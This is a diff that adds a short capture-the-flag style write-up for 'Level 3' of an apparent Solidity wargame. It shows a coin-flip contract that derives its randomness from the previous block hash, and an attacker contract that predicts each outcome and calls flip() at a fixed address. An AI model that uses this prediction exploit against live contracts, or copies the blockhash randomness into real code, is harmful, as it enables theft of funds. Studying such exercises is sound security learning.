@@ -1,0 +1,67 @@
+## Level 3
+
+What I did.
+
+I used remix IDE, copied the source of the contract "SafeMath" from Zeppelin's github repo.
+I created a new contract FlipCoin to submit guesses to the CoinFlip Address based on the outcome
+of the value of "side".
+
+
+pragma solidity ^0.4.18;
+
+import "./SafeMath.sol";
+
+
+contract CoinFlip {
+
+  using SafeMath for uint256;
+  uint256 public consecutiveWins;
+  uint256 lastHash;
+  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+  constructor () public {
+    consecutiveWins = 0;
+  }
+
+  function flip(bool _guess) public returns (bool) {
+    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+
+    if (lastHash == blockValue) {
+      revert();
+    }
+
+    lastHash = blockValue;
+    uint256 coinFlip = blockValue.div(FACTOR);
+    bool side = coinFlip == 1 ? true : false;
+
+    if (side == _guess) {
+      consecutiveWins++;
+      return true;
+    } else {
+      consecutiveWins = 0;
+      return false;
+    }
+  }
+}
+
+
+
+
+contract FlipCoin { 
+    CoinFlip public originalContract = CoinFlip(0x01321d28327Eac39a2d274C2816C9f37560Dd4fe);
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    uint256 blockValue = uint256(blockhash(block.number-1));
+    
+    constructor (bool _guess) public {
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+        
+        if (side == _guess) {
+            originalContract.flip(_guess);
+        } else {
+            originalContract.flip(!_guess);
+        }
+    }
+    
+    
+}
